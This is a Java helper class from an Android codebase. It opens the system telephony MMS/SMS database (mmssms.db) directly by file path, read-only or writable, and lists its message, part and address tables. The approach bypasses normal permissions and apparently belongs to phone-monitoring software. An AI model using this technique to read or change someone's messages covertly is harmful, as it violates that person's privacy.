package com.vvt.mms;

import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteException;

import com.vvt.database.VtDatabaseHelper;
import com.vvt.logger.FxLog;

/**
 * A helper class for querying MMS
 * Note: Limit using to a console version!
 */
class MmsDatabaseHelper {
	private static final String TAG = "MmsDatabaseHelper";
	
	private static final boolean VERBOSE = true;
	private static final boolean LOGV = Customization.VERBOSE ? VERBOSE : false;
	private static final boolean LOGW = Customization.WARNING;
	private static final boolean LOGE = Customization.ERROR;
	
	private static final String PACKAGE_NAME = "com.android.providers.telephony";
	private static final String DATABASE_FILE_NAME = "mmssms.db";
	
	public static final String COLUMN_ID = "_id";
	public static final int MESSAGE_TYPE_INBOX = 1;
	public static final int MESSAGE_TYPE_OUTBOX = 4;
	
	//PDU table.
	public static final String TABLE_PDU = "pdu";
	public static final String COLUMN_MSG_BOX = "msg_box";
	public static final String COLUMN_SUBJECT = "sub";
	public static final String COLUMN_M_TYPE = "m_type";
	public static final String COLUMN_DATE = "date";
	
	//Part table
	public static final String TABLE_PART = "part";
	public static final String COLUMN_M_ID = "mid";
	public static final String COLUMN_CONTENT_TYPE = "ct";
	public static final String COLUMN_DATA_PATH = "_data";
	public static final String COLUMN_TEXT = "text";
	
	//Addr Table
	public static final String TABLE_ADDR = "addr";
	public static final String COLUMN_MSG_ID = "msg_id";
	public static final String COLUMN_ADDRESS = "address";
	public static final String COLUMN_TYPE = "type";
	
	private static String sDbPath = null;
	
	public static SQLiteDatabase getReadableDatabase() {
		return openDatabase(SQLiteDatabase.OPEN_READONLY | SQLiteDatabase.NO_LOCALIZED_COLLATORS);
	}
	
	public static SQLiteDatabase getWritableDatabase() {
		return openDatabase(SQLiteDatabase.OPEN_READWRITE | SQLiteDatabase.NO_LOCALIZED_COLLATORS);
	}
	
	private static SQLiteDatabase openDatabase(int flags) {
		if (sDbPath == null) {
			String dbPath = VtDatabaseHelper.getSystemDatabasePath(PACKAGE_NAME);
			if (dbPath != null) {
				sDbPath = String.format("%s/%s", dbPath, DATABASE_FILE_NAME);
			}
			if(LOGV) FxLog.v(TAG, String.format("openDatabase # sDbPath: %s", sDbPath));
		}
		
		SQLiteDatabase db = tryOpenDatabase(flags);
		
		int attemptLimit = 5;
		
		while (db == null && attemptLimit > 0) {
			if(LOGW) FxLog.w(TAG, "Cannot open database. Retrying ...");
			try {
				Thread.sleep(1000);
			} 
			catch (InterruptedException e) {
				// Do nothing
			}
			
			db = tryOpenDatabase(flags);
			
			attemptLimit--;
		}
		
		return db;
	}
	
	private static SQLiteDatabase tryOpenDatabase(int flags) {
		SQLiteDatabase db = null;
		try {
			db = SQLiteDatabase.openDatabase(sDbPath, null, flags);
		}
		catch (SQLiteException e) {
			if(LOGE) FxLog.e(TAG, null, e);
		}
		return db;
	}
	
}
